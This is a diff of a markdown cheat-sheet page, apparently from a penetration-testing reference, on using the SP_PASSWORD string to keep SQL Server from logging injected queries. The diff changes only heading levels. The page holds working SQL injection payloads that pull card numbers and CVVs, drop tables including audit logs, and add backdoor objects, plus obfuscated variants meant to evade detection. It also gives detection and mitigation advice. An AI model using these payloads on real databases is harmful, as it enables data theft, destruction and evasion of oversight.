@@ -7,17 +7,15 @@ tags: ["sp_password", "log evasion", "query hiding"]
 lastUpdated: 2025-03-15
 ---
 
-## SP_PASSWORD (Hiding Query)
-
 The `SP_PASSWORD` technique is a method to prevent SQL queries from being logged in the SQL Server logs. This approach takes advantage of a security feature in Microsoft SQL Server that was designed to prevent sensitive information like passwords from being recorded in logs.
 
-### How SP_PASSWORD Works
+## How SP_PASSWORD Works
 
 When SQL Server detects the string `sp_password` anywhere in a query, it automatically prevents that query from being recorded in the SQL Server logs. This behavior was originally implemented to prevent passwords from being visible in logs when procedures like `sp_addlogin` or `sp_password` are used.
 
 However, this "feature" can be exploited by attackers to hide malicious activities by simply including the string `sp_password` in their attack queries.
 
-### Basic Usage
+## Basic Usage
 
 ```sql
 -- Normal query (would be logged)
@@ -30,9 +28,9 @@ SELECT * FROM users--sp_password
 '; DROP TABLE critical_data--sp_password
 ```
 
-### Practical Applications in SQL Injection
+## Practical Applications in SQL Injection
 
-#### Preventing Detection
+### Preventing Detection
 
 By appending `--sp_password` to injected SQL, attackers can prevent their activities from appearing in SQL Server logs:
 
@@ -44,28 +42,28 @@ By appending `--sp_password` to injected SQL, attackers can prevent their activi
 ' OR 1=1--sp_password
 ```
 
-#### Hiding Data Exfiltration
+### Hiding Data Exfiltration
 
 ```sql
 -- Data exfiltration query that won't be logged
 ' UNION SELECT creditcard_number, cvv, expiration FROM customer_payments--sp_password
 ```
 
-#### Hiding Database Structure Discovery
+### Hiding Database Structure Discovery
 
 ```sql
 -- Table discovery that won't be logged
 ' UNION SELECT table_name, column_name FROM information_schema.columns--sp_password
 ```
 
-#### Hiding Schema Modifications
+### Hiding Schema Modifications
 
 ```sql
 -- Schema modification that won't be logged
 '; ALTER TABLE users ADD backdoor_column VARCHAR(100)--sp_password
 ```
 
-### Avoiding String Literal Detection
+## Avoiding String Literal Detection
 
 If a security system looks for the exact string `sp_password`, variations can sometimes work:
 
@@ -84,7 +82,7 @@ DECLARE @s VARCHAR(100) = 's' + 'p_p' + 'assw' + 'ord'
 EXEC('SELECT * FROM users--' + @s)
 ```
 
-### Combining with Other Techniques
+## Combining with Other Techniques
 
 SP_PASSWORD can be combined with other SQL injection techniques for greater effectiveness:
 
@@ -99,7 +97,7 @@ SP_PASSWORD can be combined with other SQL injection techniques for greater effe
 '; DROP TABLE audit_logs; CREATE TABLE backdoor(id int)--sp_password
 ```
 
-### Evading Other Security Mechanisms
+## Evading Other Security Mechanisms
 
 SP_PASSWORD can be used with other evasion techniques:
 
@@ -109,7 +107,7 @@ SP_PASSWORD can be used with other evasion techniques:
 -- This builds and executes: 'select * from users'
 ```
 
-### Limitations
+## Limitations
 
 1. While the query isn't logged in SQL Server logs, it may still be:
    - Logged by application-level logging
@@ -121,7 +119,7 @@ SP_PASSWORD can be used with other evasion techniques:
 
 3. The effectiveness varies across SQL Server versions - newer versions have improved security features
 
-### Version Specifics
+## Version Specifics
 
 | SQL Server Version | Behavior                                                                      |
 | ------------------ | ----------------------------------------------------------------------------- |
@@ -130,7 +128,7 @@ SP_PASSWORD can be used with other evasion techniques:
 | SQL Server 2012+   | Additional logging mechanisms may still capture queries                       |
 | SQL Server 2016+   | Advanced threat protection features may detect suspicious patterns regardless |
 
-### Detection and Mitigation Strategies
+## Detection and Mitigation Strategies
 
 To protect against SP_PASSWORD attacks, consider:
 
@@ -170,7 +168,7 @@ BEGIN
 END
 ```
 
-### Historical Context
+## Historical Context
 
 This technique has been known for many years and was a significant security concern in older SQL Server versions. While Microsoft has improved logging and security mechanisms in newer versions, the basic behavior still exists for backward compatibility reasons.
 
